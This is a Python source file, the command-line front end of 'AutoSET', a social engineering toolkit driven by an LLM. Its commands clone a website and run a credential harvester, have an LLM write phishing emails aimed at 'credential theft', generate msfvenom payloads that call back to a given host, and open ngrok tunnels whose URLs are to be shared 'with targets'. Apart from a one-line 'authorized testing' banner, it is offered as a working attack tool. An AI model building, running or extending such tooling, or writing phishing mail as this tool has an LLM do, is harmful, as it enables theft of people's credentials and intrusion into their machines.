#!/usr/bin/env python3
"""
AutoSET - AI-Powered Social Engineering Toolkit
Main entry point
"""
import sys
import argparse
import logging
from pathlib import Path

from autoset.core.llm_provider import LLMProvider
from autoset.core.prompts import SE_SYSTEM_PROMPT, EMAIL_GENERATION_PROMPT
from autoset.tools.harvester import start_harvester
from autoset.tools.web_clone import clone_website, modify_forms
from autoset.tools.smtp import send_email
from autoset.tools.payload_gen import generate_payload, list_payloads
from autoset.tools.tunnel import start_tunnel
from autoset.utils.workspace import create_workspace
from autoset.utils.logging_setup import setup_logging

logger = logging.getLogger(__name__)

def print_banner():
    """Print AutoSET banner"""
    banner = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     █████╗ ██╗   ██╗████████╗ ██████╗ ███████╗███████╗████████╗
║    ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔════╝██╔════╝╚══██╔══╝
║    ███████║██║   ██║   ██║   ██║   ██║███████╗█████╗     ██║   
║    ██╔══██║██║   ██║   ██║   ██║   ██║╚════██║██╔══╝     ██║   
║    ██║  ██║╚██████╔╝   ██║   ╚██████╔╝███████║███████╗   ██║   
║    ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝╚══════╝   ╚═╝   
║                                                           ║
║         AI-Powered Social Engineering Toolkit            ║
║              For Authorized Testing Only                 ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
"""
    print(banner)

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="AutoSET - AI-Powered Social Engineering Toolkit")
    parser.add_argument("--provider", type=str, default="ollama", choices=["ollama", "groq", "cohere", "deepseek"])
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    args = parser.parse_args()
    
    # Setup logging
    log_level = logging.DEBUG if args.debug else logging.INFO
    log_file = setup_logging(level=log_level)
    
    print_banner()
    print(f"📝 Log file: {log_file}\n")
    
    # Initialize LLM provider
    try:
        llm = LLMProvider(provider=args.provider)
        print(f"🤖 LLM Provider: {args.provider.upper()}\n")
    except Exception as e:
        print(f"❌ Failed to initialize LLM: {e}")
        sys.exit(1)
    
    # Create workspace
    workspace = create_workspace()
    print(f"📁 Workspace: {workspace}\n")
    
    print("="*60)
    print("AutoSET Commands:")
    print("="*60)
    print("/harvest <url>              - Clone site and start harvester")
    print("/phish <email> <pretext>    - Generate and send phishing email")
    print("/payload <type> <lhost>     - Generate payload")
    print("/list-payloads <platform>   - List available payloads")
    print("/tunnel <port>              - Start ngrok tunnel")
    print("/help                       - Show this help")
    print("/exit                       - Exit AutoSET")
    print("="*60)
    print()
    
    # Main loop
    while True:
        try:
            user_input = input("autoset> ").strip()
            
            if not user_input:
                continue
            
            parts = user_input.split(maxsplit=2)
            command = parts[0].lower()
            
            if command == "/exit":
                print("👋 Goodbye!")
                break
            
            elif command == "/help":
                print("\nAutoSET Help:")
                print("  /harvest <url>           - Clone website and start credential harvester")
                print("  /phish <email> <text>    - Generate and send phishing email")
                print("  /payload <type> <lhost>  - Generate msfvenom payload")
                print("  /list-payloads [platform]- List available payloads")
                print("  /tunnel <port>           - Start ngrok tunnel for public access")
                print()
            
            elif command == "/harvest":
                if len(parts) < 2:
                    print("Usage: /harvest <url>")
                    continue
                
                url = parts[1]
                print(f"\n🎣 Starting credential harvester for {url}...")
                
                # Clone website
                clone_dir = workspace / "cloned_site"
                print(f"📥 Cloning website...")
                result = clone_website(url, str(clone_dir))
                
                if result["success"]:
                    print(f"✅ Website cloned to {result['path']}")
                    
                    # Start harvester
                    print(f"🚀 Starting credential harvester on port 8080...")
                    harvester = start_harvester(
                        port=8080,
                        output_file=str(workspace / "harvested_creds.json"),
                        redirect_url=url
                    )
                    
                    print(f"✅ Harvester running on http://localhost:8080")
                    print(f"📊 Captured credentials will be saved to: {workspace / 'harvested_creds.json'}")
                    print(f"\n💡 Tip: Use /tunnel 8080 to make it publicly accessible")
                else:
                    print(f"❌ Clone failed: {result.get('error')}")
            
            elif command == "/phish":
                if len(parts) < 3:
                    print("Usage: /phish <email> <pretext>")
                    continue
                
                target_email = parts[1]
                pretext = parts[2]
                
                print(f"\n📧 Generating phishing email for {target_email}...")
                
                # Generate email using LLM
                prompt = EMAIL_GENERATION_PROMPT.format(
                    target=target_email,
                    pretext=pretext,
                    goal="credential theft"
                )
                
                try:
                    response = llm.chat([
                        {"role": "system", "content": SE_SYSTEM_PROMPT},
                        {"role": "user", "content": prompt}
                    ])
                    
                    email_content = response["message"]["content"]
                    print(f"\n📝 Generated Email:\n{email_content}\n")
                    
                    # Ask for confirmation
                    confirm = input("Send this email? (y/n): ").strip().lower()
                    if confirm == 'y':
                        # Note: This requires SMTP configuration
                        print("⚠️  SMTP sending requires configuration. Email content saved to workspace.")
                        with open(workspace / "phishing_email.txt", 'w') as f:
                            f.write(email_content)
                        print(f"✅ Email saved to {workspace / 'phishing_email.txt'}")
                    
                except Exception as e:
                    print(f"❌ Email generation failed: {e}")
            
            elif command == "/payload":
                if len(parts) < 3:
                    print("Usage: /payload <type> <lhost> [lport]")
                    continue
                
                payload_type = parts[1]
                lhost = parts[2]
                lport = 4444
                
                print(f"\n🔧 Generating payload: {payload_type}")
                
                output_file = str(workspace / "payload.exe")
                result = generate_payload(
                    payload_type=payload_type,
                    lhost=lhost,
                    lport=lport,
                    output_file=output_file
                )
                
                if result["success"]:
                    print(f"✅ Payload generated: {result['path']}")
                    print(f"📦 Size: {result['size']} bytes")
                else:
                    print(f"❌ Payload generation failed: {result.get('error')}")
            
            elif command == "/list-payloads":
                platform = parts[1] if len(parts) > 1 else None
                print(f"\n📋 Listing payloads{f' for {platform}' if platform else ''}...")
                
                result = list_payloads(platform)
                if result["success"]:
                    print(f"Found {result['count']} payloads:")
                    for payload in result["payloads"][:20]:  # Show first 20
                        print(f"  - {payload}")
                    if result['count'] > 20:
                        print(f"  ... and {result['count'] - 20} more")
                else:
                    print(f"❌ Failed: {result.get('error')}")
            
            elif command == "/tunnel":
                if len(parts) < 2:
                    print("Usage: /tunnel <port>")
                    continue
                
                port = int(parts[1])
                print(f"\n🌐 Starting ngrok tunnel for port {port}...")
                
                try:
                    tunnel = start_tunnel(port)
                    print(f"✅ Tunnel active: {tunnel.get_url()}")
                    print(f"💡 Share this URL with targets")
                except Exception as e:
                    print(f"❌ Tunnel failed: {e}")
            
            else:
                print(f"Unknown command: {command}")
                print("Type /help for available commands")
        
        except KeyboardInterrupt:
            print("\n\n👋 Exiting...")
            break
        except Exception as e:
            logger.error(f"Error: {e}", exc_info=True)
            print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
